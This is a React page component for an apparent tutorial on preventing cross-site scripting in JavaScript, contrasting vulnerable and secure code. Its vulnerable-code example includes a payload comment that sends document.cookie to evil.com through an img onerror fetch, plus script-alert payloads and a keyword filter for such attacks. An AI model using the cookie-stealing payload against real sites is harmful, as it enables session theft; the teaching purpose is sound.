'use client';

import React from 'react';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Alert, AlertDescription, AlertTitle } from '@/components/ui/alert';
import { PageHeader } from '@/components/shared/generic-page-header';
import {
  Sparkles,
  Shield,
  AlertTriangle,
  CheckCircle,
  XCircle,
  Code2,
  Lightbulb,
} from 'lucide-react';

export default function JavaScriptXSSPrevention() {
  return (
    <div className="w-full space-y-8 pb-16">
      <PageHeader
        icon={Shield}
        category="JavaScript Security"
        title="XSS Prevention"
        description="Protect your application from Cross-Site Scripting attacks"
        colorTheme="red"
      />

      {/* What is XSS */}
      <Card className="border-0 shadow-sm bg-gradient-to-br from-red-50/50 via-orange-50/30 to-rose-50/20 dark:from-red-950/10 dark:via-orange-950/5 dark:to-rose-950/5">
        <CardContent className="pt-8 space-y-6">
          <div className="flex items-start gap-4">
            <div className="p-3 rounded-2xl bg-gradient-to-br from-red-500 to-orange-500 text-white shadow-lg">
              <Shield className="w-6 h-6" />
            </div>
            <div className="flex-1">
              <h3 className="text-2xl font-bold mb-3 text-gray-900 dark:text-gray-100">
                What is XSS (Cross-Site Scripting)?
              </h3>
              <p className="text-lg leading-relaxed text-gray-700 dark:text-gray-300">
                XSS is a security vulnerability where attackers inject <strong className="text-red-700 dark:text-red-400">malicious scripts</strong> into web pages. When other users view these pages, the scripts execute in their browsers, potentially stealing data, hijacking sessions, or performing unauthorized actions.
              </p>
            </div>
          </div>

          <div className="grid md:grid-cols-3 gap-4">
            <div className="p-5 rounded-xl bg-gradient-to-br from-red-50 to-rose-100 dark:from-red-950/30 dark:to-rose-900/30 border-2 border-red-200 dark:border-red-800/30">
              <div className="flex items-center gap-2 mb-2">
                <AlertTriangle className="w-5 h-5 text-red-600 dark:text-red-400" />
                <h4 className="font-semibold text-red-900 dark:text-red-100">Reflected XSS</h4>
              </div>
              <p className="text-sm text-gray-700 dark:text-gray-300">
                Malicious script in URL/request immediately reflected in response
              </p>
            </div>

            <div className="p-5 rounded-xl bg-gradient-to-br from-orange-50 to-amber-100 dark:from-orange-950/30 dark:to-amber-900/30 border-2 border-orange-200 dark:border-orange-800/30">
              <div className="flex items-center gap-2 mb-2">
                <AlertTriangle className="w-5 h-5 text-orange-600 dark:text-orange-400" />
                <h4 className="font-semibold text-orange-900 dark:text-orange-100">Stored XSS</h4>
              </div>
              <p className="text-sm text-gray-700 dark:text-gray-300">
                Malicious script stored in database, executed when data is displayed
              </p>
            </div>

            <div className="p-5 rounded-xl bg-gradient-to-br from-purple-50 to-pink-100 dark:from-purple-950/30 dark:to-pink-900/30 border-2 border-purple-200 dark:border-purple-800/30">
              <div className="flex items-center gap-2 mb-2">
                <AlertTriangle className="w-5 h-5 text-purple-600 dark:text-purple-400" />
                <h4 className="font-semibold text-purple-900 dark:text-purple-100">DOM-based XSS</h4>
              </div>
              <p className="text-sm text-gray-700 dark:text-gray-300">
                Vulnerability in client-side JavaScript that processes user input unsafely
              </p>
            </div>
          </div>
        </CardContent>
      </Card>

      {/* Common XSS Attack Vectors */}
      <Card>
        <CardHeader>
          <div className="flex items-center gap-3">
            <div className="p-2 rounded-lg bg-red-100 dark:bg-red-900/30">
              <AlertTriangle className="w-5 h-5 text-red-600 dark:text-red-400" />
            </div>
            <div>
              <CardTitle>Common XSS Attack Vectors</CardTitle>
              <CardDescription>Where attackers inject malicious code</CardDescription>
            </div>
          </div>
        </CardHeader>
        <CardContent>
          <div className="space-y-4">
            <div className="p-4 rounded-lg bg-red-50 dark:bg-red-950/20 border-l-4 border-red-500">
              <h4 className="font-semibold text-red-900 dark:text-red-100 mb-2">innerHTML Assignment</h4>
              <p className="text-sm text-gray-700 dark:text-gray-300 mb-3">
                Directly inserting user input into innerHTML without sanitization
              </p>
              <div className="p-3 rounded bg-slate-50 dark:bg-slate-900 text-slate-900 dark:text-slate-100 font-mono text-xs">
                element.innerHTML = userInput; // ❌ Dangerous!
              </div>
            </div>

            <div className="p-4 rounded-lg bg-orange-50 dark:bg-orange-950/20 border-l-4 border-orange-500">
              <h4 className="font-semibold text-orange-900 dark:text-orange-100 mb-2">URL Parameters</h4>
              <p className="text-sm text-gray-700 dark:text-gray-300 mb-3">
                Reading URL parameters and displaying them without encoding
              </p>
              <div className="p-3 rounded bg-slate-50 dark:bg-slate-900 text-slate-900 dark:text-slate-100 font-mono text-xs">
                const name = new URLSearchParams(location.search).get('name');<br/>
                document.write(name); // ❌ Dangerous!
              </div>
            </div>

            <div className="p-4 rounded-lg bg-purple-50 dark:bg-purple-950/20 border-l-4 border-purple-500">
              <h4 className="font-semibold text-purple-900 dark:text-purple-100 mb-2">eval() and Similar Functions</h4>
              <p className="text-sm text-gray-700 dark:text-gray-300 mb-3">
                Executing user input as code
              </p>
              <div className="p-3 rounded bg-slate-50 dark:bg-slate-900 text-slate-900 dark:text-slate-100 font-mono text-xs">
                eval(userInput); // ❌ Extremely dangerous!
              </div>
            </div>

            <div className="p-4 rounded-lg bg-blue-50 dark:bg-blue-950/20 border-l-4 border-blue-500">
              <h4 className="font-semibold text-blue-900 dark:text-blue-100 mb-2">Event Handlers</h4>
              <p className="text-sm text-gray-700 dark:text-gray-300 mb-3">
                Dynamically setting event handlers with user input
              </p>
              <div className="p-3 rounded bg-slate-50 dark:bg-slate-900 text-slate-900 dark:text-slate-100 font-mono text-xs">
                element.onclick = new Function(userInput); // ❌ Dangerous!
              </div>
            </div>
          </div>
        </CardContent>
      </Card>

      {/* Example: Vulnerable Code */}
      <Card>
        <CardHeader>
          <CardTitle>Example 1: Vulnerable Code</CardTitle>
          <CardDescription>❌ What NOT to do</CardDescription>
        </CardHeader>
        <CardContent>
          <pre className="p-4 rounded-lg bg-slate-50 dark:bg-slate-900 text-slate-900 dark:text-slate-100 overflow-x-auto border-2 border-red-300 dark:border-red-800">
            <code>{`// ❌ VULNERABLE: User input directly in innerHTML
function displayComment(comment) {
  document.getElementById('comments').innerHTML += \`
    <div class="comment">\${comment}</div>
  \`;
}

// Attacker can inject:
// <script>alert('XSS')</script>
// <img src=x onerror="fetch('evil.com?cookie='+document.cookie)">

// ❌ VULNERABLE: URL parameter displayed without encoding
const greeting = new URLSearchParams(location.search).get('name');
document.getElementById('greeting').innerHTML = \`Hello, \${greeting}!\`;

// Attacker URL:
// ?name=<script>alert('XSS')</script>

// ❌ VULNERABLE: eval() with user input
const userCode = prompt('Enter calculation:');
const result = eval(userCode); // Can execute ANY code!

// ❌ VULNERABLE: Dynamic script creation
const scriptTag = document.createElement('script');
scriptTag.textContent = userInput; // Dangerous!
document.body.appendChild(scriptTag);`}</code>
          </pre>
        </CardContent>
      </Card>

      {/* XSS Prevention Techniques */}
      <Card>
        <CardHeader>
          <div className="flex items-center gap-3">
            <div className="p-2 rounded-lg bg-green-100 dark:bg-green-900/30">
              <Shield className="w-5 h-5 text-green-600 dark:text-green-400" />
            </div>
            <div>
              <CardTitle>XSS Prevention Techniques</CardTitle>
              <CardDescription>How to protect your application</CardDescription>
            </div>
          </div>
        </CardHeader>
        <CardContent>
          <div className="grid md:grid-cols-2 gap-4">
            <div className="p-5 rounded-xl bg-green-50 dark:bg-green-950/20 border-2 border-green-200 dark:border-green-800/30">
              <h4 className="font-bold text-green-900 dark:text-green-100 mb-3">✅ Output Encoding</h4>
              <p className="text-sm text-gray-700 dark:text-gray-300 mb-3">
                Encode special characters before displaying user input
              </p>
              <ul className="space-y-2 text-sm text-gray-700 dark:text-gray-300">
                <li className="flex items-start gap-2">
                  <span className="text-green-600 dark:text-green-400 mt-1">•</span>
                  <span>HTML encode: &lt; becomes &amp;lt;</span>
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-green-600 dark:text-green-400 mt-1">•</span>
                  <span>Use textContent instead of innerHTML</span>
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-green-600 dark:text-green-400 mt-1">•</span>
                  <span>Use setAttribute() for attributes</span>
                </li>
              </ul>
            </div>

            <div className="p-5 rounded-xl bg-blue-50 dark:bg-blue-950/20 border-2 border-blue-200 dark:border-blue-800/30">
              <h4 className="font-bold text-blue-900 dark:text-blue-100 mb-3">✅ Input Validation</h4>
              <p className="text-sm text-gray-700 dark:text-gray-300 mb-3">
                Validate and sanitize user input on both client and server
              </p>
              <ul className="space-y-2 text-sm text-gray-700 dark:text-gray-300">
                <li className="flex items-start gap-2">
                  <span className="text-blue-600 dark:text-blue-400 mt-1">•</span>
                  <span>Whitelist allowed characters</span>
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-blue-600 dark:text-blue-400 mt-1">•</span>
                  <span>Reject suspicious patterns</span>
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-blue-600 dark:text-blue-400 mt-1">•</span>
                  <span>Validate data types and formats</span>
                </li>
              </ul>
            </div>

            <div className="p-5 rounded-xl bg-purple-50 dark:bg-purple-950/20 border-2 border-purple-200 dark:border-purple-800/30">
              <h4 className="font-bold text-purple-900 dark:text-purple-100 mb-3">✅ Content Security Policy</h4>
              <p className="text-sm text-gray-700 dark:text-gray-300 mb-3">
                HTTP header that restricts where scripts can load from
              </p>
              <ul className="space-y-2 text-sm text-gray-700 dark:text-gray-300">
                <li className="flex items-start gap-2">
                  <span className="text-purple-600 dark:text-purple-400 mt-1">•</span>
                  <span>Blocks inline scripts by default</span>
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-purple-600 dark:text-purple-400 mt-1">•</span>
                  <span>Whitelist trusted script sources</span>
                </li>
              </ul>
            </div>

            <div className="p-5 rounded-xl bg-amber-50 dark:bg-amber-950/20 border-2 border-amber-200 dark:border-amber-800/30">
              <h4 className="font-bold text-amber-900 dark:text-amber-100 mb-3">✅ Use Frameworks Safely</h4>
              <p className="text-sm text-gray-700 dark:text-gray-300 mb-3">
                Modern frameworks have built-in XSS protection
              </p>
              <ul className="space-y-2 text-sm text-gray-700 dark:text-gray-300">
                <li className="flex items-start gap-2">
                  <span className="text-amber-600 dark:text-amber-400 mt-1">•</span>
                  <span>React auto-escapes JSX expressions</span>
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-amber-600 dark:text-amber-400 mt-1">•</span>
                  <span>Vue escapes template interpolations</span>
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-amber-600 dark:text-amber-400 mt-1">•</span>
                  <span>Angular sanitizes by default</span>
                </li>
              </ul>
            </div>
          </div>
        </CardContent>
      </Card>

      {/* Example: Secure Code */}
      <Card>
        <CardHeader>
          <CardTitle>Example 2: Secure Code</CardTitle>
          <CardDescription>✅ Proper XSS prevention</CardDescription>
        </CardHeader>
        <CardContent>
          <pre className="p-4 rounded-lg bg-slate-50 dark:bg-slate-900 text-slate-900 dark:text-slate-100 overflow-x-auto border-2 border-green-300 dark:border-green-800">
            <code>{`// ✅ SAFE: Use textContent instead of innerHTML
function displayCommentSafe(comment) {
  const div = document.createElement('div');
  div.className = 'comment';
  div.textContent = comment; // Automatically escapes HTML
  document.getElementById('comments').appendChild(div);
}

// ✅ SAFE: HTML encoding function
function escapeHTML(text) {
  const div = document.createElement('div');
  div.textContent = text;
  return div.innerHTML;
}

function displayGreeting(name) {
  const safe = escapeHTML(name);
  document.getElementById('greeting').innerHTML = \`Hello, \${safe}!\`;
}

// ✅ SAFE: DOMPurify library for sanitization
import DOMPurify from 'dompurify';

function displayRichContent(html) {
  const clean = DOMPurify.sanitize(html);
  element.innerHTML = clean; // Safe because sanitized
}

// ✅ SAFE: React auto-escapes
function CommentComponent({ comment }) {
  return <div className="comment">{comment}</div>;
  // React automatically escapes the comment
}

// ✅ SAFE: Avoid dangerous patterns
// Instead of eval():
const safeCalc = new Function('return ' + sanitizedExpression)();

// Better: use a safe expression parser library
import { evaluate } from 'mathjs';
const result = evaluate(userInput); // Only math expressions allowed`}</code>
          </pre>
        </CardContent>
      </Card>

      {/* Real-World Example */}
      <Card>
        <CardHeader>
          <CardTitle>Example 3: Real-World Scenario - Comment System</CardTitle>
          <CardDescription>Complete XSS-safe implementation</CardDescription>
        </CardHeader>
        <CardContent>
          <pre className="p-4 rounded-lg bg-slate-50 dark:bg-slate-900 text-slate-900 dark:text-slate-100 overflow-x-auto">
            <code>{`// Comment system with XSS protection

class CommentSystem {
  constructor(containerId) {
    this.container = document.getElementById(containerId);
  }
  
  // ✅ Escape HTML entities
  escapeHTML(text) {
    const map = {
      '&': '&amp;',
      '<': '&lt;',
      '>': '&gt;',
      '"': '&quot;',
      "'": '&#039;'
    };
    return text.replace(/[&<>"']/g, m => map[m]);
  }
  
  // ✅ Validate input
  validateComment(text) {
    if (!text || text.trim().length === 0) {
      throw new Error('Comment cannot be empty');
    }
    if (text.length > 1000) {
      throw new Error('Comment too long');
    }
    // Check for suspicious patterns
    const dangerous = /<script|javascript:|onerror=/i;
    if (dangerous.test(text)) {
      throw new Error('Invalid content detected');
    }
    return true;
  }
  
  // ✅ Safe display method
  addComment(username, text) {
    try {
      this.validateComment(text);
      
      // Create elements safely
      const commentDiv = document.createElement('div');
      commentDiv.className = 'comment';
      
      const userSpan = document.createElement('span');
      userSpan.className = 'username';
      userSpan.textContent = this.escapeHTML(username); // Safe
      
      const textSpan = document.createElement('span');
      textSpan.className = 'text';
      textSpan.textContent = this.escapeHTML(text); // Safe
      
      const timeSpan = document.createElement('span');
      timeSpan.className = 'time';
      timeSpan.textContent = new Date().toLocaleString();
      
      commentDiv.appendChild(userSpan);
      commentDiv.appendChild(textSpan);
      commentDiv.appendChild(timeSpan);
      
      this.container.appendChild(commentDiv);
      
    } catch (error) {
      console.error('Failed to add comment:', error.message);
      alert('Comment rejected: ' + error.message);
    }
  }
}

// Usage
const comments = new CommentSystem('comments-container');
comments.addComment('Alice', 'Great article!'); // Safe
comments.addComment('Eve', '<script>alert("XSS")</script>'); // Blocked!`}</code>
          </pre>
        </CardContent>
      </Card>

      {/* Best Practices */}
      <Card>
        <CardHeader>
          <div className="flex items-center gap-3">
            <div className="p-2 rounded-lg bg-cyan-100 dark:bg-cyan-900/30">
              <Lightbulb className="w-5 h-5 text-cyan-600 dark:text-cyan-400" />
            </div>
            <div>
              <CardTitle>XSS Prevention Best Practices</CardTitle>
              <CardDescription>Follow these security guidelines</CardDescription>
            </div>
          </div>
        </CardHeader>
        <CardContent>
          <div className="grid md:grid-cols-2 gap-4">
            <div className="p-5 rounded-xl bg-green-50 dark:bg-green-950/20 border-2 border-green-200 dark:border-green-800/30">
              <h4 className="font-bold text-green-900 dark:text-green-100 mb-3 flex items-center gap-2">
                <CheckCircle className="w-5 h-5" />
                ✅ Do
              </h4>
              <ul className="space-y-2 text-sm text-gray-700 dark:text-gray-300">
                <li>• Use textContent for displaying text</li>
                <li>• Encode/escape all user input</li>
                <li>• Validate input on server-side</li>
                <li>• Use CSP headers</li>
                <li>• Keep frameworks/libraries updated</li>
                <li>• Use DOMPurify for rich content</li>
                <li>• Set HttpOnly flag on cookies</li>
                <li>• Regular security audits</li>
              </ul>
            </div>

            <div className="p-5 rounded-xl bg-red-50 dark:bg-red-950/20 border-2 border-red-200 dark:border-red-800/30">
              <h4 className="font-bold text-red-900 dark:text-red-100 mb-3 flex items-center gap-2">
                <XCircle className="w-5 h-5" />
                ❌ Don't
              </h4>
              <ul className="space-y-2 text-sm text-gray-700 dark:text-gray-300">
                <li>• Use innerHTML with user input</li>
                <li>• Use eval() or Function constructor</li>
                <li>• Trust client-side validation only</li>
                <li>• Use document.write()</li>
                <li>• Create inline event handlers dynamically</li>
                <li>• Disable XSS protection features</li>
                <li>• Rely on blacklists (use whitelists)</li>
                <li>• Ignore framework security features</li>
              </ul>
            </div>
          </div>
        </CardContent>
      </Card>

      {/* Key Takeaways */}
      <Card className="border-2 border-red-300 dark:border-red-700 bg-gradient-to-br from-red-50 via-orange-50 to-rose-50 dark:from-red-950/20 dark:via-orange-950/10 dark:to-rose-950/10 shadow-lg">
        <CardContent className="pt-8">
          <div className="flex items-center gap-3 mb-6">
            <div className="p-3 rounded-xl bg-gradient-to-br from-red-500 to-orange-500 text-white shadow-lg">
              <Sparkles className="w-6 h-6" />
            </div>
            <h3 className="text-2xl font-bold text-gray-900 dark:text-gray-100">Key Takeaways</h3>
          </div>
          
          <div className="grid sm:grid-cols-2 gap-4">
            <div className="p-5 rounded-xl bg-white dark:bg-slate-900 border-2 border-red-200 dark:border-red-800/30">
              <div className="flex items-start gap-3">
                <span className="text-3xl">🛡️</span>
                <div>
                  <h4 className="font-semibold mb-1.5 text-gray-900 dark:text-gray-100">Never Trust User Input</h4>
                  <p className="text-sm text-gray-600 dark:text-gray-400">
                    Always encode, validate, and sanitize<br/>
                    Treat all input as potentially malicious
                  </p>
                </div>
              </div>
            </div>

            <div className="p-5 rounded-xl bg-white dark:bg-slate-900 border-2 border-red-200 dark:border-red-800/30">
              <div className="flex items-start gap-3">
                <span className="text-3xl">📝</span>
                <div>
                  <h4 className="font-semibold mb-1.5 text-gray-900 dark:text-gray-100">Use textContent</h4>
                  <p className="text-sm text-gray-600 dark:text-gray-400">
                    Prefer textContent over innerHTML<br/>
                    Automatically escapes HTML
                  </p>
                </div>
              </div>
            </div>

            <div className="p-5 rounded-xl bg-white dark:bg-slate-900 border-2 border-red-200 dark:border-red-800/30">
              <div className="flex items-start gap-3">
                <span className="text-3xl">🚫</span>
                <div>
                  <h4 className="font-semibold mb-1.5 text-gray-900 dark:text-gray-100">Avoid Dangerous Functions</h4>
                  <p className="text-sm text-gray-600 dark:text-gray-400">
                    Never use eval() or Function()<br/>
                    Don't use document.write()
                  </p>
                </div>
              </div>
            </div>

            <div className="p-5 rounded-xl bg-white dark:bg-slate-900 border-2 border-red-200 dark:border-red-800/30">
              <div className="flex items-start gap-3">
                <span className="text-3xl">🔒</span>
                <div>
                  <h4 className="font-semibold mb-1.5 text-gray-900 dark:text-gray-100">Use CSP & Libraries</h4>
                  <p className="text-sm text-gray-600 dark:text-gray-400">
                    Implement Content Security Policy<br/>
                    Use DOMPurify for sanitization
                  </p>
                </div>
              </div>
            </div>
          </div>

          <Alert className="mt-6 bg-gradient-to-r from-red-100 to-rose-100 dark:from-red-950/30 dark:to-rose-950/30 border-red-300 dark:border-red-700">
            <Shield className="h-5 w-5 text-red-600 dark:text-red-400" />
            <AlertTitle className="text-red-900 dark:text-red-100">Security First</AlertTitle>
            <AlertDescription className="text-gray-700 dark:text-gray-300">
              XSS is one of the most common web vulnerabilities. <strong>Always</strong> encode output, validate input, and use security headers. Prevention is easier than recovery!
            </AlertDescription>
          </Alert>
        </CardContent>
      </Card>
    </div>
  );
}
